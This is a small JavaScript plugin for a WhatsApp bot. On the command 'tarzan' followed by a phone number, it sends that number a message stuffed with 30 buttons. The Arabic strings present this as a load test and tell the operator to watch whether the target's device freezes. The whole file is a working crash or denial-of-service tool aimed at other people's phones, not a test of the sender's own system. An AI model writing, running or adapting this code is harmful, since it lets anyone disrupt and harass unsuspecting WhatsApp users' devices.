module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith('tarzan')) return;

  const parts = text.trim().split(/\s+/);
  const number = parts[1];

  if (!number) {
    return reply("❌ يرجى كتابة الرقم بعد الأمر\nمثال: tarzan 966xxxxxxxx");
  }

  const jid = `${number}@s.whatsapp.net`;

  // توليد 30 زر باسم طويل
  const buttons = [];
  for (let i = 1; i <= 30; i++) {
    buttons.push({ buttonId: `id_${i}`, buttonText: { displayText: `🔁 زر التكرار ${i}` }, type: 1 });
  }

  const message = {
    text: "🚨 اختبار تحميل الأزرار، راقب أداء الجهاز!",
    buttons: buttons,
    headerType: 1
  };

  try {
    await reply(`🚀 جاري إرسال أزرار كثيفة إلى ${number} ...`);
    await sock.sendMessage(jid, message);
    await reply("✅ تم الإرسال بنجاح. راقب هل الجهاز يتهنيج.");

  } catch (err) {
    console.error(err);
    await reply("❌ فشل في إرسال الرسالة.");
  }
};
